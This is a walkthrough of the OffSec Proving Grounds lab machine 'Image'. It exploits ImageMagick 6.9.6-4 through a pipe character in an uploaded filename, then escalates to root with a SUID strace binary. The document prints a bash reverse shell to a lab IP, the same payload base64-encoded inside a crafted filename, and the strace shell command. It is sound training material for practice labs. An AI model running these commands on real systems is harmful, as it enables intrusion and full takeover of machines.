# Image — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Easy
**OS:** Linux

---

## TL;DR

ImageMagick 6.9.6-4 command injection via pipe character in filename → reverse shell as www-data → SUID `strace` → root.

---

## Enumeration

```bash
sudo nmap -sC -p- -n -Pn -sV --min-rate=9362 192.168.183.178 -oN nmap.txt
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu |
| 80 | HTTP | Apache httpd 2.4.41 ("ImageMagick Identifier") |

The web application on port 80 is titled **"ImageMagick Identifier"** — it takes an uploaded image and processes it with ImageMagick. The version is **6.9.6-4**.

---

## Exploitation — ImageMagick Command Injection via Filename

ImageMagick has a known vulnerability where the pipe character (`|`) in filenames triggers command execution:

Reference: [ImageMagick Issue #6339](https://github.com/ImageMagick/ImageMagick/issues/6339)

The trick is to create a file with a specially crafted filename. Since our reverse shell payload contains special characters, we base64-encode it:

1. Create the base64-encoded payload:

```
/bin/bash -i >& /dev/tcp/192.168.45.161/6969 0>&1
```

Encoded: `L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTYxLzY5NjkgMD4mMQ==`

2. Rename our image file with the injection payload:

```bash
cp en.png '|en"echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTYxLzY5NjkgMD4mMQ== | base64 -d | bash".png'
```

3. Upload this file to the web app, start a listener, and catch the shell.

We're in as `www-data`.

---

## Privilege Escalation — SUID strace

Check for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

`strace` has the SUID bit set. From GTFOBins:

```bash
strace -o /dev/null /bin/sh -p
```

This spawns a shell with preserved SUID privileges — **root**. 🎉

---

## Key Takeaways

- **ImageMagick filename injection** — the pipe character in filenames triggers command execution. This is a classic vector for image processing applications
- **Base64 encoding** is great for sneaking payloads past character restrictions in filenames
- **SUID `strace`** is a direct path to root — it can execute arbitrary commands with elevated privileges

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
